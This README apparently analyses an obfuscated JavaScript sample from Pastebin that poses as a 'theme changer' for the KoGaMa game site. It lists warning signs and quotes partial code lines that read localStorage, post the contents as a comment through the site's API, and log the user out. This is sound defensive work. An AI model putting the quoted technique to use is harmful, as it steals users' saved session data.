# Malware Sample Analysis: Obfuscated JavaScript Payload

## Overview
This repository contains an analysis of a malicious JavaScript sample found on Pastebin, which masquerades as a benign "theme changer" utility. The script is heavily obfuscated and exhibits clear malicious behavior.

⚠️ **Warning**: Do not execute this script outside of a controlled sandbox environment.

## Sample Information
- **Source**: [Pastebin Link](https://pastebin.com/raw/UqK3rjrA)
- **Claimed Function**: Theme changer utility
- **Actual Behavior**: Malicious payload (analysis ongoing)

## Indicators of Compromise
The script exhibits several red flags:

1. **Suspicious Attribution**
   - Unknown author ("Lavar") with no verifiable identity
   - No legitimate project homepage or documentation

2. **Obfuscation Techniques**
   - Heavy use of encoding and string manipulation
   - Unnecessary complexity for stated purpose
   - Obfuscated network calls

3. **Anomalous Code Patterns**
   ```javascript
   fetch('https://www.kogama.com/api/feed/31872096/comment/[...]') // A request to post a comment
   ({'comment':localStorage[_0x5acfe3(0x206)](...)})  // Accessing localStorage (saved data contents)
   const _0x1a7136=['addEventListener','getElementById','application/json','https://www.kogama.com/auth/logout'] // Getting an element by ID and logging us out
   ```

